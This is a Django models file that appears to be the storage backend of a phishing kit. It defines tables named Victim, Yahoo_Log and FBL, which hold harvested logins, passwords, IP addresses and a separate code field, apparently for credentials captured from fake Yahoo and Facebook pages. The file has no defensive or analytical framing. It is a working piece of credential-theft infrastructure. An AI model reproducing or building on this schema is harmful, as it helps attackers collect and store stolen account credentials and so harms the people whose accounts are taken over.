from django.db import models

class Victim(models.Model):
    login=models.CharField(max_length=260)
    password=models.CharField(max_length=260)
    ip=models.CharField(max_length=250)
    code=models.CharField(max_length=250,blank=True,null=True)


class Yahoo_Log(models.Model):
    mail=models.CharField(max_length=260, blank=True,null=True)
    psw1=models.CharField(max_length=260, blank=True,null=True)
    psw2=models.CharField(max_length=260, blank=True,null=True)
    ip=models.CharField(max_length=250, blank=True,null=True)


class FBL(models.Model):
    login=models.CharField(max_length=260, blank=True,null=True)
    psw=models.CharField(max_length=260, blank=True,null=True)
    ip=models.CharField(max_length=260, blank=True,null=True)
